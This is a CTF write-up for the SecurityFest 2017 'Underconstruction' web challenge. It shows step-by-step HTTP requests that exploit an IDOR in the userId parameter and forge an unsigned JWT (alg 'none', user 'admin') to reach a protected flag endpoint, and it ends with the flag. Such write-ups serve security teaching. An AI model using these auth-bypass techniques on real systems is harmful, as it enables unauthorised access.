---
layout: post
title: "SecurityFest 2017 - Underconstruction"
date:   2017-06-01 21:05
categories: CTF
tags: [SecurityFest2017]
categories: [web]
author: jbz
---

Under Construction! Please protect your head, wear a hardhat.
Service: http://web.ctf.rocks:8080
Author: Kits / weckzen

In the HTML source of the index there is a comment saying that the backend allows you to connect by posting `{"username": "user", "password":"password"}` to `/login`.

```
POST /login HTTP/1.1
Host: web.ctf.rocks:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 43

{"username": "user", "password":"password"}
```

In the response you get an `Athorization Bearer` token and the link `/apis` where you can list your available APIs.

*As Java errors are enabled and displayed you can manage to understand which parameters are missing while invoking APIs.*

We request our APIS:

```
GET /apis?userId=52 HTTP/1.1
Host: web.ctf.rocks:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzA5OTExMn0.lRlvydjfWCMlavdcqvb6qth4Mp0zyFo3Zs50ngIZ1Jk
```

And we get:

```
{"urls":["/login","/apis"],"id":52,"user":"user"}
```
Then we request the admin's APIs:

```
GET /apis?userId=0 HTTP/1.1
Host: web.ctf.rocks:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzA5OTExMn0.lRlvydjfWCMlavdcqvb6qth4Mp0zyFo3Zs50ngIZ1Jk
```

And we get:

```
{"urls":["/login","/apis","/supersecretflagresource"],"id":0,"user":"admin"}
```

Ok we have the flag endpoint, but if we try to GET it we receive a 403.

```
GET /supersecretflagresource HTTP/1.1
Host: web.ctf.rocks:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzA5OTQ0OX0.O1BEqBvnt44Q6CIlWJK2hIzg8Ja9ycyOnIGc1Z-Zxzo
```

By analizing the token, we can see that is a JWT with HS256.

```
{
    "alg": "HS256"
}
{
    "user": "user",
    "exp": 1497099449
}
```

In some `JWT` libraries there is a vulnerability that allows to set `none` as algorithm and bypass the signature verification. This is the case.
You hust need to create a JWT token with `"alg":"none"` and `"user":"admin"` and perform the GET again.

```
GET /supersecretflagresource HTTP/1.1
Host: web.ctf.rocks:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Authorization: Bearer eyJhbGciOiJub25lIn0_.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE0OTcwOTk0NDl9.
``` 
And the result is:

```
{"message":"You are close now","script":"function getFlag() {   var text = $('.c-intro').innerText;   return 'SCTF{' + text.slice(35,38) + text.slice(0,10) + '}';}","url":"https://kits.se?kokitotsos"}
```    
Finally you need to browse to `https://kits.se?kokitotsos` and execute the returned Javascript to get the flag.

**SCTF{lolKOKITOTSOS}**
